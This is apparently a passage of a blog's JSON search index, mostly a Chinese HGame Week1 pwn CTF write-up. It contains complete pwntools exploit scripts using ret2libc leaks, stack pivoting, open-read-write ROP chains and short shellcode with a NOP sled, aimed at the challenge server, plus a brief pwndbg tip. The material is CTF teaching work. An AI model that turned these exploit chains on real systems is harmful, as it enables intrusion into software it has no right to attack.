\u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 查找gadget的内置函数 rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #需要自行设定offset offset:int = 0x108 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # 发送payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # 得到真实地址 puts_addr:int = recv_and_transform() # 计算得到基址和system地址 base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) # 注意栈对齐 payload = flat({offset-8:[ fake_stack, pop_rsi, fake_stack, read_addr, leave_ret ]}) sendline_after_clean(payload) payload = flat([ \u0026#34;./flag\\x00\\x00\u0026#34;, pop_rdi, flag, pop_rsi, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]) sendline_after_clean(payload) interactive_after_clean() 法二：ret2libc后更改rdx重新read 我们在ret2libc后可以考虑更改rdx再返回到vuln+0x1E处：\n然后就能栈溢出任意长字节了\n然后我们再用read把\u0026quot;flag\u0026quot;读入一个可写的地址处，这样我们就能orw得到flag了\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-orw\u0026#34; libc_name:str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30527\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break vuln c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 查找gadget的内置函数 rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] suclog( pop_rdi_ret=pop_rdi_ret, ret=ret ) #需要自行设定offset offset:int = 0x108 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] vuln_addr: int = m_elf.sym[\u0026#34;vuln\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, vuln_addr=vuln_addr ) # 发送payload payload = flat({offset:[ pop_rdi_ret, puts_got, puts_plt, vuln_addr ]}) sendline_after_clean(payload) # 得到真实地址 puts_addr:int = recv_and_transform() # 计算得到基址和system地址 base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] open_addr: int = base_addr + libc.sym[\u0026#39;open\u0026#39;] read_addr: int = base_addr + libc.sym[\u0026#39;read\u0026#39;] # puts_addr: int = base_addr + libc.sym[\u0026#39;puts\u0026#39;] pop_rdi: int = base_addr + 0x0000000000023b6a pop_rsi: int = base_addr + 0x2601f pop_rdx: int = base_addr + 0x142c92 fake_stack = 0x404060 + 0x200 flag = fake_stack flag_content = 0x404060 + 0x300 leave_ret = 0x00000000004012be suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, open_addr=open_addr, read_addr=read_addr, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx, ) payload = flat({offset:[ pop_rdx, 0xffff, vuln_addr+0x1E ]}) sendline_after_clean(payload) payload = flat({offset:[ pop_rdi, 0, pop_rsi, flag, pop_rdx, 0xff, read_addr, pop_rdi, flag, pop_rsi, 0, pop_rdx, 0, open_addr, pop_rdi, 3, pop_rsi, flag_content, pop_rdx, 0xff, read_addr, pop_rdi, flag_content, puts_addr, ]}) sendline_after_clean(payload) sendline_after_clean(b\u0026#34;./flag\\x00\\x00\u0026#34;) interactive_after_clean() simple_shellcode checksec ida 程序允许我们输入一个0x10字节长的shellcode并执行，同时禁掉了execve和execveat，然而一般的orw shellcode是不可能只有这么短的，所以我们必须从程序的上下文发现漏洞所在\n法一：利用call的特性 我们可以利用call的特性，call会把下一条指令的地址push进栈中，因此我们可以利用栈中的数据跳转到main函数的任意位置\n我们跳转到这里，就可以read进0xcafe0000个字节：\n然后我们就可以输入orw的shellcode进行读写了：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov rsi, rdx sub qword ptr [rsp], 36 ret \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # 生成orw的shellcode payload = flat([ asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() 法二：直接syscall调用read覆盖指令 根据调用0xcafe0000前寄存器的状态：\n我们可以使用以下shellcode调用read：\nxchg edx, esi xchg r14d, edi xchg r11d, edx syscall xchg 指令是 x86 汇编语言中的一条指令，它用于交换两个数据的值。它的语法一般是 xchg dest, src，表示将 src 和 dest 中的值交换。这两个参数可以是寄存器或内存地址。 例如，如果寄存器 eax 中存储着数值 4，寄存器 ebx 中存储着数值 5，那么执行 xchg eax, ebx 后，eax 将存储 5，ebx 将存储 4。 xchg 指令通常用于交换两个值，并且它不需要额外的寄存器，因此在多处理器环境中，xchg 指令也可以用来实现互斥锁 需要注意的是，xchg指令是原子的，即在其完成前不会被中断。这是因为 XCHG 指令的实现是通过硬件交换两个数据而不是通过读取和写入实现的，这意味着在这个指令完成之前不能被任何其他指令打断。\n或者使用：\nmov esi, edx xor edi, edi syscall 在 x86 汇编语言中，mov esi, edx 和 mov rsi, rdx 都是用来将寄存器 edx 的值赋给寄存器 esi (rsi)的指令。但这两条指令的二进制长度是不同的。 mov esi, edx 这条指令使用的是 32 位寄存器，它对应的二进制长度为 2 字节；而mov rsi, rdx 使用的是64位寄存器，二进制长度为3字节. 一般来说使用32位寄存器，shellcode会更短\n然后使用nop滑板划到orw的shellcode：\npayload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) nop 指令是 x86 汇编语言中的一条指令，它代表 \u0026ldquo;no operation\u0026rdquo;，即不执行任何操作。在二进制中，它对应的是 0x90。 这个指令用于调整指令流程，如在程序执行前或执行后插入 NOP 指令来调整程序中的偏差。也可用于占位用，例如将指令按照预期的顺序分布。 在高级编程中，NOP指令也可能被用来作为指令重定位的起始位置或终止位置，研究和分析程序的指令流程。\n完整exp：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./HGame-simple_shellcode\u0026#34; libc_name: str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30295\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x13BB) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True, is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = flat([ asm(\u0026#39;\u0026#39;\u0026#39; mov esi, edx xor edi, edi syscall \u0026#39;\u0026#39;\u0026#39;) ]) sendline_after_clean(payload) # 生成orw的shellcode payload = flat([ asm(\u0026#34;nop\u0026#34;)*0x10, asm(shellcraft.cat(\u0026#34;./flag\u0026#34;)) ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2023年01月18日","permalink":"https://peterliuzhi.top/writeup/hgame-week1-pwn-writeup/","section":"writeup","summary":"The greatest healing therapy is friendship and love. — Hubert Humphrey test_nc nc连上远程直接cat flag easy_overflow checksec ida 简单的栈溢出，唯一需要注意的是在get shell前将标准输出流关掉了，但我们可以用shell命令","tags":["pwn","更改got表","orw","栈迁移","转移程序","nop滑板","shellcraft生成orw的shellcode"],"title":"HGame Week1 PWN WriteUp"},{"categories":["tricks"],"contents":" A man\u0026rsquo;s growth is seen in the successive choirs of his friends — Ralph Waldo Emerson\n问题 在使用pwntools调试程序的时候，在gdb窗口中使用pwndbg的特殊命令出现如下警告：\n按指示下载了相关的库之后警告却并没有消失，这实在是一件非常蛋疼的事情\n如果不能使用pwndbg相关命令，我们就只能用vmmap查看heap基址，然后用x一个一个chunk看，非常麻烦\n解决方法（大部分情况下） 在gdb窗口输入：\nset resolve-heap-via-heuristic on 这和我们用vmmap查看heap基址的原理一样，pwndbg会尝试通过这个基址计算出heap的信息，这不一定是对的，但至少在很多情况下能用\n原本没有这个功能，是一位大佬发现gef中没有调试符号也能正常使用，于是参考gef给pwndbg做了一个PR，详情见Heap inspection without libc debug symbols · Issue #937 · pwndbg/pwndbg · GitHub，感谢这位师傅\n","date":"2023年01月17日","permalink":"https://peterliuzhi.top/tricks/pwntools%E8%B0%83%E7%94%A8gdb%E8%B0%83%E8%AF%95%E6%97%B6%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8binsheap%E7%AD%89%E5%91%BD%E4%BB%A4/","section":"tricks","summary":"A man\u0026rsquo;s growth is seen in the successive choirs of his friends — Ralph Waldo Emerson 问题 在使用pwntools调试程序的时候，在gdb窗口中使用pwndbg的特殊命令出现如下警告： 按指示下载了相关的库之","tags":["pwn"],"title":"pwntools调用gdb调试时无法使用bins、heap等命令"},{"categories":["writeup"],"contents":" The best preparation for tomorrow is doing your best today. — H. Jackson Brown Jr.\n原题链接\nchecksec查看程序架构 